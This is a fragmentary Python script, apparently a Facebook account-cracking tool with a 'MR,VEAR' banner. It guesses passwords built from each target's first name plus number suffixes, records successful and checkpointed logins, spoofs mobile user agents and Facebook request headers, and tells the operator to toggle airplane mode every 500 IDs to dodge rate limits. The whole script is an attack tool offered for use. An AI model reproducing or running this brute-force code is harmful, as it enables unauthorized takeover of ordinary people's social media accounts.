...
　　　　　∠_,,,/       ☠️'MR,VEAR'☠️
{asu}---------------------------------------------------{P}
 Future    {M}:\033[1;37m {H}F{P}|{H}R{P}|{H}E{P}|{H}E{P}
 Status    {M}:\033[1;32m FILE x ID PUBLIC{P}
...
def passwrd():
	...
	DynoXD(f'{N}│ │ [{k}•{x}] LORD,VIP {k}CP{x} SAVE IN : {k}%s{x}  {N}│'%(cpc))
	DynoXD(f'{N}│ ╰────────[{k}✨ON/OF AIRPLANE MODE EVERY 500 ID✨{N}]─────────╯') #%(okc,cpc))
	DynoXD(f"│")
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append('first12')
					pwv.append('first1122')
					pwv.append('first112233')
					pwv.append('first2000')
					pwv.append('first2002')
					pwv.append('first2003')
...
'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; 17MB150WB Build/NZH54D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Safari/537.36'
    ...
    'x-fb-request-id': 'AFwI9LRswZ-IXjcs-Lbqy0Q',
    'x-fb-trace-id': 'DDLCDnCN3JJ',
    'x-fb-rev': '1008078756',
    'x-fb-debug': 'smBdHbxJTTpQUIbyMfPE41/sweRSWHxJVp6Wfd7tEf6INb7Xg7D9hcDSHed1cUc2wB/9h3bfNfWxeuFKNx6YLA==',
